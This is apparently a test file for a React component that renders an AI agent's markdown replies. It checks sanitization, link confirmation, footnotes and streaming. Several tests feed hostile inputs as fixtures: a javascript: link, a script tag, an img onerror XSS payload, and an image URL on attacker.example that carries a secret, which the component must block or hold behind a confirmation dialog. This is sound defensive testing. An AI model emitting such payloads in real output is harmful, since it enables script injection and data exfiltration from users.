import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { MessageResponse } from './message';

describe('MessageResponse', () => {
  it('draws a table as part of the text, with no frame or buttons, keeping its columns\' alignment', () => {
    render(<MessageResponse>{'| Measured step | Time |\n| --- | ---: |\n| V2 database migration | 2 min 17 sec |'}</MessageResponse>);
    const table = screen.getByRole('table');
    expect(screen.getAllByRole('columnheader').map((cell) => cell.textContent)).toEqual(['Measured step', 'Time']);
    expect(screen.getByRole('cell', { name: '2 min 17 sec' })).toHaveStyle({ textAlign: 'right' });
    expect(table.closest('[data-streamdown="table-wrapper"]')?.querySelector('button')).toBeNull();
    expect(table.querySelector('thead')).not.toHaveClass('bg-muted/80');
  });

  it('wraps at word boundaries unless an unbroken token would overflow', () => {
    const { container } = render(
      <MessageResponse>A normal user message with readable word boundaries.</MessageResponse>,
    );
    const response = container.firstElementChild;

    expect(response).toHaveClass('[overflow-wrap:break-word]');
    expect(response).not.toHaveClass('[overflow-wrap:anywhere]');
  });

  it('renders streaming markdown and repairs an incomplete code fence', () => {
    const { container, rerender } = render(
      <MessageResponse mode="streaming">{'A **split'}</MessageResponse>,
    );

    rerender(
      <MessageResponse mode="streaming">
        {'A **split message**\n\n```ts\nconst answer = 42;'}
      </MessageResponse>,
    );

    expect(screen.getByText('split message')).toBeInTheDocument();
    expect(screen.getByText('const answer = 42;')).toBeInTheDocument();
    expect(container.querySelector('code')).toHaveTextContent('const answer = 42;');
  });

  it('sanitizes unsafe markup while preserving safe links and long content', () => {
    const longWord = 'a'.repeat(512);
    const { container } = render(
      <MessageResponse>
        {`${longWord}\n\n[safe](https://example.com)\n\n[unsafe](javascript:alert(1))\n\n<script>window.bad = true</script>`}
      </MessageResponse>,
    );

    expect(screen.getByText(longWord)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'safe' })).toBeInTheDocument();
    expect(screen.queryByRole('link', { name: 'unsafe' })).not.toBeInTheDocument();
    expect(screen.getByText(/unsafe/)).toHaveAttribute('title', expect.stringContaining('Blocked URL'));
    expect(container.querySelector('script')).not.toBeInTheDocument();
  });

  it('shows raw HTML from an agent as text, never as markup', () => {
    const { container } = render(<MessageResponse>{'Use <b>bold</b> and <img src=x onerror=alert(1)> here.'}</MessageResponse>);
    expect(container.querySelector('b')).not.toBeInTheDocument();
    expect(container.querySelector('img')).not.toBeInTheDocument();
    expect(container).toHaveTextContent('Use <b>bold</b> and <img src=x onerror=alert(1)> here.');
  });

  it('never loads an image an agent names: it becomes a link that asks before opening', async () => {
    const user = userEvent.setup();
    const open = vi.spyOn(window, 'open').mockImplementation(() => null);
    try {
      const { container } = render(
        <MessageResponse>{'![chart](https://attacker.example/p.png?d=secret) and ![][logo]\n\n[logo]: https://cdn.example/logo.png'}</MessageResponse>,
      );
      expect(container.querySelector('img')).not.toBeInTheDocument();
      expect(document.head.querySelector('link[rel="preload"]')).not.toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Image' })).toBeInTheDocument();
      await user.click(screen.getByRole('button', { name: 'Image: chart' }));
      expect(screen.getByRole('alertdialog', { name: 'Open a link to attacker.example?' })).toHaveTextContent('https://attacker.example/p.png?d=secret');
      expect(open).not.toHaveBeenCalled();
    } finally {
      open.mockRestore();
    }
  });

  it('scrolls to a footnote and back within the message, without asking to open a link', async () => {
    const user = userEvent.setup();
    const scrolled: string[] = [];
    const scrollIntoView = vi.spyOn(Element.prototype, 'scrollIntoView').mockImplementation(function (this: Element) {
      scrolled.push(this.id);
    });
    try {
      render(<MessageResponse>{'A claim.[^1]\n\n[^1]: The source.'}</MessageResponse>);
      await user.click(screen.getByRole('link', { name: '1' }));
      expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument();
      await user.click(screen.getByRole('link', { name: /Back to reference/ }));
      expect(scrolled).toEqual(['user-content-fn-1', 'user-content-fnref-1']);
    } finally {
      scrollIntoView.mockRestore();
    }
  });

  it('marks a code fence still arriving only while the message streams', () => {
    const { container, rerender } = render(<MessageResponse isAnimating>{'```ts\nconst answer = 42;'}</MessageResponse>);
    expect(container.querySelector('[data-incomplete]')).toBeInTheDocument();
    rerender(<MessageResponse isAnimating={false}>{'```ts\nconst answer = 42;\n```'}</MessageResponse>);
    expect(container.querySelector('[data-incomplete]')).not.toBeInTheDocument();
  });

  it('opens a link only once the person confirms it, naming its host and the whole URL', async () => {
    const user = userEvent.setup();
    const open = vi.spyOn(window, 'open').mockImplementation(() => null);
    try {
      render(<MessageResponse>{'See [the docs](https://docs.example.com/guide?ref=agent).'}</MessageResponse>);
      await user.click(screen.getByRole('button', { name: 'the docs' }));
      expect(screen.getByRole('alertdialog', { name: 'Open a link to docs.example.com?' })).toHaveTextContent('https://docs.example.com/guide?ref=agent');
      expect(screen.getByRole('button', { name: "Don't open" })).toHaveFocus();
      await user.click(screen.getByRole('button', { name: "Don't open" }));
      expect(open).not.toHaveBeenCalled();
      await user.click(screen.getByRole('button', { name: 'the docs' }));
      await user.click(screen.getByRole('button', { name: 'Open' }));
      expect(open).toHaveBeenCalledWith('https://docs.example.com/guide?ref=agent', '_blank', expect.anything());
    } finally {
      open.mockRestore();
    }
  });
});
